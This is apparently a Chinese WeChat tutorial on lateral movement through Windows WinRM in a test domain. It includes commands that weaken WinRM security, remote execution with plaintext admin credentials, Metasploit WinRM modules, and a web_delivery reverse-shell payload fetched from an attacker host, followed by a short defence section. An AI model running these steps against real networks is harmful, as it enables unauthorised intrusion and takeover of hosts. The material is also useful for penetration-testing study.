#  内网渗透｜利用 WinRM 进行横向渗透

原创 WHOAMI  [ HACK学习呀 ](javascript:void\(0\);)

**HACK学习呀** ![]()

微信号 Hacker1961X

功能介绍
HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！

____

__

收录于话题 #内网渗透 ,11个

  

![](https://gitee.com/fuli009/images/raw/master/public/20210915145617.png)

## 前言

WinRM 作为 Windows 操作系统的一部分，是一项允许管理员在系统上远程执行管理任务的服务。这样的服务当然不会被攻击者错过，本篇文章我们就来讲讲
WinRM 在横向渗透中的使用。

## WinRM 服务简介

WinRM 是 Windows Remote Managementd（Windows 远程管理）的简称，是 Web 服务管理标准 WebService-
Management 协议的 Microsoft
实现。该协议是基于简单对象访问协议（SOAP）的、防火墙友好的标准协议，允许来自不同供应商的硬件和操作系统能够互操作。

WinRM 作为 Windows 操作系统的一部分，是一项允许管理员在系统上远程执行管理任务的服务。并且，WinRM 默认情况下支持 Kerberos 和
NTLM 身份验证以及基本身份验证，初始身份验证后，WinRM 会话将使用 AES 加密保护。使用 WinRM 服务需要拥有管理员级别的权限。

在现代 Windows 系统中，WinRM HTTP 通过 TCP 端口 5985 进行通信，而 HTTPS（TLS）通过 TCP 端口 5986
进行通信。如果所有的机器都是在域环境下，则可以使用默认的 5985 端口，否则的话则通过 5986 端口使用 HTTPS 传输。

使用 WinRM 我们可以在远程主机设置了防火墙的情况下远程管理这台服务器，因为启动 WinRM 服务后，防火墙默认会自动放行 5985
端口。这样的管理服务当然不会被攻击者错过，在内网渗透中，我们可以使用 WinRM
服务进行横向移动，并且使用这种远程连接进行横向移动不容易被察觉到，也不会占用远程连接数。

## WinRM 服务的安装与配置

要利用 WinRM 服务，并让 `winrm` 命令行工具执行相应操作，通信的双方必须同时安装和配置好 Windows 远程管理。

### WinRM 服务的安装

Windows 远程管理服务（WinRM）适用于 Windows Server 2008 和 Windows 7
以后的操作系统并自动与其支持的操作系统一起安装，但是只有在 Windows Server 2008 以上的操作系统 WinRM
服务才会自动启动，其他都需要手动开启。

### WinRM 服务的配置

默认情况下，不配置 WinRM 侦听器。即使 WinRM 服务正在运行，也不能接收或发送 WS-Management 协议消息。

使用以下命令可以查看 WinRM 侦听器配置情况：

    
    
    winrm e winrm/config/listener# 或 winrm enumerate winrm/config/listener

![](https://gitee.com/fuli009/images/raw/master/public/20210915145621.png)image-20210804153757275

如上图，有几个参数：

•Address：表示监听器所监听的地址。•Transport：用于指定用于发送和接收 WS-Management 协议请求和响应的传输类型，如 HTTP
或 HTTPS，其默认值为 HTTP。•Port：表示监听器所监听 TCP 端口。•Hostname：正在运行 WinRM
服务的计算机的主机名。该值必须是完全限定的域名、IPv4 或 IPv6 文本字符串或通配符。•Enabled：表示是启用还是禁用侦听器，其默认值为
True，表示启用。•URLPrefix：用于指定要在其上接受 HTTP 或 HTTPS 请求的 URL 前缀。例如，如果计算机名称为
SampleMachine，则 WinRM 客户端将在目标地址中指定 `https://SampleMachine/<在目标地址中指定的
URLPrefix>`。默认 URL 前缀为
"wsman"。•CertificateThumbprint：用于指定服务证书的指纹。•ListeningOn：用于指定侦听器使用的 IPv4 和 IPv6
地址。

若要检查具体配置设置的状态，可以使用以下命令：

    
    
    winrm get winrm/config

![](https://gitee.com/fuli009/images/raw/master/public/20210915145622.png)image-20210804155451344

你可以使用以下命令启动 WinRM 服务，并对 WinRM 服务进行默认配置：

    
    
    winrm quickconfig

![](https://gitee.com/fuli009/images/raw/master/public/20210915145623.png)image-20210804160813342

该命令将执行以下这些操作：

•启动 WinRM 服务，并将服务启动类型设置为 "自动启动"。启动后，防火墙会默认并放行 5985 端口。•为在任何 IP 地址上使用 HTTP 或
HTTPS 发送和接收 WS-Management 协议消息的端口配置侦听器。•定义 WinRM 服务的 ICF 异常，并打开 HTTP 和 HTTPS
端口。

还有一些其他配置命令：

    
    
    # 使用 PowerShell 查询 WinRM 状态Get-WmiObject-Class win32_service | Where-Object{$_.name -like "WinRM"}# 开启 WinRM 远程管理Enable-PSRemoting–force# 设置 WinRM 自启动Set-ServiceWinRM-StartModeAutomatic# 对 WinRM 服务进行快速配置，包括开启 WinRM 和开启防火墙异常检测, HTTPS传输, 5986端口winrm quickconfig -transport:https    # 为 WinRM 服务配置认证winrm set winrm/config/service/auth @{Basic="true"}# 修改 WinRM 默认端口winrm set winrm/config/client/DefaultPorts@{HTTPS="8888"}# 为 WinRM 服务配置加密方式为允许非加密：winrm set winrm/config/service @{AllowUnencrypted="true"}# 设置只允许指定 IP 远程连接 WinRMwinrm set winrm/config/Client@{TrustedHosts="192.168.10.*"}# 设置允许所有 IP 远程连接 WinRMwinrm set winrm/config/Client@{TrustedHosts="*"}

## WinRM 的默认组访问权限

在安装过程中，WinRM 将创建本地组 `WinRMRemoteWMIUsers__`，然后，WinRM 将远程访问设置为本地管理组和
`WinRMRemoteWMIUsers__` 组中的用户。我们可以通过以下命令

    
    
    net localgroup WinRMRemoteWMIUsers__<username>/add

来向 `WinRMRemoteWMIUsers__` 组中添加本地用户、域用户或域组。

## 利用 WinRM 服务远程执行命令

### 使用 winrs 命令

WinRS 是 Windows 的远程 Shell，它相当于 WinRM 的客户端，使用它可以访问运行有 WinRM 的服务器，不过自己也得装上 WinRM
才能运行 WinRS。使用如下。

在 WinRM 客户端主机上执行以下命令：

    
    
    winrs -r:http://192.168.93.30:5985 -u:administrator -p:Whoami2021 whoamiwinrs -r:http://192.168.93.30:5985 -u:administrator -p:Whoami2021 ipconfig# winrs -r:[ip] -u:[username] -p:[password] <command>

执行后得到以下报错：

![](https://gitee.com/fuli009/images/raw/master/public/20210915145624.png)image-20210804172346402

> Winrs error:WinRM 客户端无法处理该请求。可以在下列条件下将默认身份验证与 IP 地址结合使用: 传输为 HTTPS 或目标位于
> TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts
> 列表中的计算机可能未经过身份验证。有关如何设置 TrustedHosts 的详细信息，请运行以下命令: winrm help config。

此时，需要在客户端上执行下面这条命令，设置为信任所有主机，再去连接即可：

    
    
    winrm set winrm/config/Client@{TrustedHosts="*"}

然后便可以正常使用了：

![](https://gitee.com/fuli009/images/raw/master/public/20210915145625.png)image-20210804172824608

如上图所示，成功在远程主机上执行命令。

### 使用 winrm 命令

我们也可以直接通过 `winrm` 命令执行远程主机上的程序，通常是木马程序，这里我们尝试执行启动一个计算器：

    
    
    winrm invoke create wmicimv2/win32_process -SkipCAcheck-skipCNcheck @{commandline="calc.exe"} -r:DC.whoamianony.org

![](https://gitee.com/fuli009/images/raw/master/public/20210915145626.png)image-20210804214149793

如下图所示，成功正在远程主机上启动了一个 calc 进程：

![](https://gitee.com/fuli009/images/raw/master/public/20210915145630.png)image-20210804214037070

### 使用 Invoke-Command 命令

Invoke-Command 是 PowerShell 上的一个命令，用来在本地或远程计算机上执行命令。如下所示：

    
    
    Invoke-Command-ComputerName192.168.93.30-Credential whoamianony\administrator -Command{ipconfig}# Invoke-Command -ComputerName [host] -Credential [user] -Command {[command]}# Invoke-Command -ComputerName [host] -Credential [user] -ScriptBlock {[command]}

•-ComputerName：指定要连接的远程主机名或者
IP。•-Credential：指定有权连接到远程计算机的用户的帐户。•-Command：指定需要执行的命令。

![](https://gitee.com/fuli009/images/raw/master/public/20210915145631.png)image-20210804215420172

如上图所示，成功在远程主机上执行命令。

## 利用 WinRM 获取交互式会话

### 使用 winrs 命令

在 WinRM 客户端主机上执行以下命令启动远程主机的 CMD 即可：

    
    
    winrs -r:http://192.168.93.30:5985 -u:administrator -p:Whoami2021 cmd

![](https://gitee.com/fuli009/images/raw/master/public/20210915145632.png)image-20210804180229253

### 使用 Enter-PSSession 命令

使用 `Enter-PSSession` 可以在 PowerShell
上直接启动一个与远程主机的交互式会话。在会话期间，您键入的命令在远程计算机上运行，就像您直接在远程计算机上键入一样。

在 WinRM 客户端主机上执行以下命令：

    
    
    New-PSSession-NameWinRM1-ComputerName DC.whoamianony.org -Credential whoamianony\administrator -Port5985

•-Name：指定启动的会话名称。•-ComputerName：指定要连接的远程主机名或者
IP。•-Credential：指定有权连接到远程计算机的用户的帐户。•-Port：指定 WinRM 工作端口。

如下图所示，执行该命令后，成功启动了一个与远程主机的交互式会话，该会话的名称为 WinRM1：

![](https://gitee.com/fuli009/images/raw/master/public/20210915145633.png)image-20210804174314450

执行 `Get-PSSession` 命令可以查看当前创建的所有会话：

![](https://gitee.com/fuli009/images/raw/master/public/20210915145634.png)image-20210804175004739

此时，可以选中一个会话进入其交互模式执行命令，：

    
    
    Enter-PSSession-NameWinRM1

![](https://gitee.com/fuli009/images/raw/master/public/20210915145635.png)image-20210804174607718

执行 `Exit-PSSession` 命令即可退出当前会话。

注意，如果当前网络环境是工作组环境运行，或客户端未加入域，直接使用 `Enter-PSSession` 可能会报错以下错误：

> Winrs error:WinRM 客户端无法处理该请求。如果身份验证方案与 Kerberos 不同，或者客户端计算机未加入到域中，则必须使用
> HTTPS 传输或者必须将目标计算机添加到 TrustedHosts 配置设置。使用 winrm.cmd 配置
> TrustedHosts。请注意，TrustedHosts 列表中的计算机可能未经过身份验证。通过运行以下命令 可获得有关此内容的更多信息: winrm
> help config。

此时则需要先在客户端执行以下命令才能使用 `Enter-PSSession`：

    
    
    Set-Item wsman:localhostClientTrustedHosts -value *

## 利用 WinRM 进行横向渗透

测试环境如下：

![](https://gitee.com/fuli009/images/raw/master/public/20210915145637.png)image-20210804200655657

假设此时攻击者已经拿下了内网中的主机 Windows 10，需要继续以 Windows 10 为跳板进行横向移动来拿下 Windows Server
2012，假设此时已经获取到了一个域管理员的登录凭据，并且通过端口扫描发现 Windows Server 2012 开启了 WinRM 服务：

![](https://gitee.com/fuli009/images/raw/master/public/20210915145639.png)image-20210804212802935

下面我们尝试通过 WinRM 获取 Windows Server 2012 的控制权。

### 使用 Metasploit 内置模块

Metasploit 框架内置了多个模块，可用于发现启用了 WinRM 服务的主机，发现用于服务认证的凭证以及执行任意命令和代码。

    
    
    auxiliary/scanner/winrm/winrm_auth_methodsauxiliary/scanner/winrm/winrm_loginauxiliary/scanner/winrm/winrm_cmdexploit/windows/winrm/winrm_script_exec

下面我们依次试用上述模块。

•`auxiliary/scanner/winrm/winrm_auth_methods`

该模块可以发现启用了 WinRM 服务的系统及其支持的身份验证协议，使用如下：

    
    
    use auxiliary/scanner/winrm/winrm_auth_methodsset DOMAIN whoamianonyset rhosts 192.168.93.30run

![](https://gitee.com/fuli009/images/raw/master/public/20210915145640.png)image-20210804211757503

如上图所示，发现远程主机 Windows Server 2012 开启了 WinRM 服务并且三种类型的身份验证都支持。

•`auxiliary/scanner/winrm/winrm_login`

模块可以确定我们获得的管理员凭据是否对其他系统有效：

    
    
    use auxiliary/scanner/winrm/winrm_loginset DOMAIN whoamianonyset USERNAME administratorset PASSWORD Whoami2021set rhosts 192.168.93.30set rport 5985run

![](https://gitee.com/fuli009/images/raw/master/public/20210915145642.png)image-20210804211908907

如上图所示当前管理员凭据对目标主机 Windows Server 2012 是有效的。确定凭据有效后，我们开始尝试对目标主机 Windows Server
2012 执行命令。

•`auxiliary/scanner/winrm/winrm_cmd`

该模块可以通过 WinRM 服务对远程主机执行任意命令，该模块需要有管理员权限的凭据。

    
    
    use auxiliary/scanner/winrm/winrm_cmdset rhosts 192.168.93.30set DOMAIN whoamianonyset USERNAME administratorset PASSWORD Whoami2021set CMD ipconfig    # 设置需要执行的命令run

![](https://gitee.com/fuli009/images/raw/master/public/20210915145643.png)image-20210804210518981

•`exploit/windows/winrm/winrm_script_exec`

该模块将尝试修改 PowerShell 执行策略以允许执行未签名的脚本，然后将 PowerShell 脚本写入磁盘并自动执行以返回一个
Meterpreter 会话。

    
    
    use exploit/windows/winrm/winrm_script_execset rhosts 192.168.93.30set DOMAIN whoamianonyset USERNAME administratorset PASSWORD Whoami2021set payload windows/meterpreter/bind_tcpset rhost 192.168.93.30set lport 4444exploit

执行后，如攻击成功，则可获得一个目标主机的 Meterpreter 会话。我这里在本地测试的时候没有成功不知道为什么。

### 借助 Web_delivery 模块

首先我们使用 Web_delivery 模块在攻击机上开启 Web 服务托管 Payload：

    
    
    use exploit/multi/script/web_deliveryset target 2# 选择使用powershell类型的payloadset payload windows/x64/meterpreter/reverse_tcpset lhost 192.168.93.129set lport 4444exploit

![](https://gitee.com/fuli009/images/raw/master/public/20210915145645.png)image-20210804223331035

然后再在 Windows 10 的 Meterpreter Shell 中通过 winrs 对 Windows Server 2012 执行命令，获取一个
交互的 Shell：

    
    
    winrs -r:http://192.168.93.30:5985 -u:administrator -p:Whoami2021 cmd

![](https://gitee.com/fuli009/images/raw/master/public/20210915145646.png)image-20210804222907058

然后在 Windows Server 2012 的 Shell 中执行 Web_delivery 模块生成的 PowerShell 命令即可上线：

![](https://gitee.com/fuli009/images/raw/master/public/20210915145648.png)image-20210804223743878

## 对于 WinRM 横向移动的防御

对于防御来自 WinRM 的横向移动，我们可以考虑以下两个方面。

•设置主机白名单，仅允许某些可信的计算机连接到 WinRM 服务器。•严格限制，确保仅允许本地管理组和 `WinRMRemoteWMIUsers__`
组中的用户有权使用 WinRM。•......

## Ending......

![](https://gitee.com/fuli009/images/raw/master/public/20210915145649.png)

 **推荐阅读：**

> https://docs.microsoft.com/en-us/windows/win32/winrm/authentication-for-
> remote-connections

> https://blog.csdn.net/qq_36119192/article/details/105122945

> https://pentestlab.blog/?s=winrm

> https://pentestn00b.wordpress.com/2016/08/22/powershell-psremoting-pwnage/

 **点赞，转发，在看**

文章首发：FreeBuf  

原创投稿作者：WHOAMI  

![](https://gitee.com/fuli009/images/raw/master/public/20210915145651.png)

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

内网渗透｜利用 WinRM 进行横向渗透

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

